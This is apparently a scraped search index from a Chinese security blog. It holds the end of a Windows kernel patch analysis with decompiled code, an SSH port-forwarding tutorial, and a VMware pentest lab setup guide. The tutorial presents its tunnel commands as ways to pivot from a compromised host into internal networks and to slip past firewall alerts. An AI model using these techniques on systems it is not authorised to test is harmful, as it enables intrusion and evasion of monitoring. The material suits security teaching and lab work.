在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } 参考链接：\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSH隧道","tags":[],"description":"","content":"SSH隧道 SSH提供了三种转发模式：本地端口转发、远程端口转发以及动态端口转发，本文将介绍这三种转发模式的用法。\n一些基本概念 本地主机：SSH客户端所在的主机。\n远程主机：相对于本地主机的概念，在本地主机之外的主机叫远程主机。\nSSH命令行参数解释\n-C:压缩传输，提高传输速度 -f:将ssh转入后台执行 -N:建立静默连接（连接后看不到具体会话） -g:允许远程主机连接本地用于转发的端口 -L:本地端口转发 -R:远程端口转发 本地端口转发 本地端口转发，即将本地端口转发到远程主机上，命令格式：ssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\n举例：\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d 在SSH Client运行命令ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ，将127.0.0.1:1313端口转发到SSH Server的127.0.0.1:1313端口上。此时SSH Client访问127.0.0.1:1313的结果跟访问在SSH Server端的127.0.0.1:1313结果一样。\n在SSH Client上\n此时在SSH Client上的ssh会监听127.0.0.1:1313这个端口，该端口的TCP数据通过ssh隧道传输到SSH server上。\n在SSH Server上，先监听127.0.0.1:1313端口，本文监听使用hugo 启动一个server。\n在SSH Client上使用curl 127.0.0.1:1313命令时返回的内容即为SSH Server上127.0.0.1:1313的内容\n同时本地端口转发命令中remote ip不止限制在127.0.0.1上，remote ip可以是任何一个SSH Server能够连接的host，实际上本地端口转发过程中，实际上是把SSH Server当作跳板机，连通SSH Client和SSH Server另外一端的主机，如下：\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Client不能访问但是SSH Server能访问的主机|\n本地端口转发一般应用场景为在渗透测试过程中控制了目标网络中带有SSH Server的一台机器，通过这台机器做为跳板机来访问内网其他主机上的服务。一定程度上规避防火墙的流量告警（因为ssh流量为加密流量）\n远程端口转发。 远程端口转发即和本地端口转发是相反的概念，本地端口转发是将本地端口转发到远程端口上，连接本地端口即跟连接远程端口一个效果。而远程端口转发即将远程端口转发到本地，使得连接远程端口即跟连接本地端口一样。命令格式：ssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\n举例：\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d 本次我们将SSH Client的3389端口转发到SSH Server（公网服务器）上，使得另外一台机器能够通过SSH Server的端口连接到位于局域网的SSH Client的远程桌面。\n在ssh client上运行命令\n此时任何连接SSH Server:9898的请求都会被转发到SSH Client的58989端口上，该端口监听的服务为远程桌面服务。在另外一台电脑（不同于SSH Server和SSH Client）使用远程桌面连接SSH Server:9898\n同本地端口转发一样，远程端口转发命令中的local ip可以是任何一个SSH Client能够连接的host，此时SSH Client被当作跳板机，连通SSH Client另外一端和SSH Server端的主机。\n|SSH Serve能够连通的主机| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Client能访问但是SSH Server不能访问的主机|\n远程端口转发应用场景一般是将局域网的某些服务通过SSH隧道暴露在公网上，或者在渗透测试过程中，控制了内网的某台主机，通过远程端口转发，将该主机作为跳板机来访问内网其他服务，因为此时SSH是从内网连接到外网，在流量上没有那么可疑。\n动态端口转发 在本地端口转发和远程端口转发过程中，一次性只能转发一个端口，在某些场景下效率太低了，而动态端口转发没有指定目的端口，相对于前两种来说更灵活。实际上动态端口转发即为SSH实现的SOCKS协议。命令格式:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;。\n在SSH Client执行命令即可在SSH Client和SSH Server之间建立socks5隧道，SSH Client可以连接该隧道来传输数据。\n组合利用 在一些情况下可以通过组合上面三种转发来达到意想不到的效果。\n例如，有两台位于互不相通的局域网主机，如果一台想要访问另外一台能够访问的服务时，可以以下面的方式达到目的\n在主机1上执行命令 ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; 将主机1的ssh端口转发到公网服务器的9898端口。\n在主机2执行命令ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; 此时ssh连接的是主机1，且建立了socks隧道，通过该隧道主机2可以方便的使用主机1能访问而主机2不能直接访问的服务。\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"基于Vmware的小型域网络搭建","tags":[],"description":"","content":"基于Vmware的小型域网络搭建 摘要 在渗透的日常学习过程中经常需要一个内网环境，本篇文章介绍如何使用Vmware和MikroTik搭建简易的二层内网环境。\n网络结构 整个网络分为结构分为三层，第一层模拟外网环境，第二层为DMZ区域，该区域通过边界路由器的端口映射，将第二层网络主机的一些端口映射到边界路由器上对外提供服务，第三层模拟办公网，该层网络为域网络，同时可以控制第二层网络的主机。\n整个网络拓扑图如下：\nIP设置：\n第一层网络为（外网）：192.168.59.0/24\n第二层网络为（DMZ区域）：192.168.72.0/24\n第三层网络为（办公网）：172.16.2.0/24\n路由器IP地址：\n边界路由器：192.168.59.141 | 192.168.72.2\n内网路由器：192.168.72.254 | 172.16.2.254\n网络搭建 网络设置 首先使用VMware的虚拟网络编辑器增加两个网络VMnet2、VMnet3，都勾选仅主机模式，同时取消下面两个勾，如下图：\nVMnet3同理，同时在DHCP设置处设置相应的IP地址和掩码。其中外层网络为nat模式，VMnet2为DMZ区域网络，VMnet3为办公网络\n虚拟机搭建 整个网络在最少情况下一共需要六台虚拟机，分为两台ROS，四台网络中的主机。\nROS从hxxps://mikrotik.com/download下载stable版本的ova格式的镜像，之后导入到VMware中。一共需要导入两次，分别命名为ROS，ROS-1。除了下载镜像之外还需要下载winbox方便对路由器进行设置。\n网络中主机分布：\nDMZ：Ubuntu 2004、windows7\n办公网：Windows server2019、windows7\n创建上述虚拟机，并将DMZ区域的主机的网卡设置为VMnet2，办公网的主机设置为VMnet3.\n将边界路由器ROS网卡设置为net模式和VMnet2模式，内网路由器设置为VMnet2和VMnet3模式。\nIP地址及路由器设置 经历上面的步骤之后，基本的网络拓扑已经搭建完成，接下来需要对网络内的主机和路由器进行设置使得网络中的主机能够相互ping通。\n首先设置两个网络中的主机IP地址\nDMZ：\nWindows7：192.168.72.4/24 网关192.168.72.2 DNS114.114.114.114\nUbuntu ：192.168.72.3/24 网关192.168.72.2 DNS114.\n114.114.114\n办公网：\nWindows server 2019：172.16.2.4/24 网关172.16. 2.254 DNS127.0.0.1\nwindows7：172.16.2.3/24 网关172.16.2.254 DNS172.16.2.4\n至此，两个网络的主机应该可以ping通同一个网络的主机。接下来设置两个ROS的IP地址。\n打开winbox，点击Neighbors按钮，会自动嗅探网络内的存活的路由器，如下图所示。\n上图为边界路由器的IP地址，如果分配了IP地址则可以在浏览器通过IP地址浏览路由器的web界面，在如果没有分配IP地址则通过wibbox使用MAC地址登录\n进入之后，在左侧选项卡会列出路由器拥有的所有网卡接口，点击之后进入到接口详情界面，在里面会列出该接口的一些基本信息，可以通过网卡的MAC分辨该网卡对应在vmware中的网卡，将两个网卡名称分别设置为ether1-wan和ether2-lan，之后在ip-\u0026gt;addresses选项卡中将ether-lan设置为下图。ether1-wan不用设置，因为该网卡网络类型为nat会自动dhcp分配\n之后在IP-\u0026gt;Firewall-\u0026gt;NAT中新建规则，chain：srcnat，out.interface:ether2-lan,action:masquerade\n该规则将使得路由器两边的网络联通。\n参考\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""}]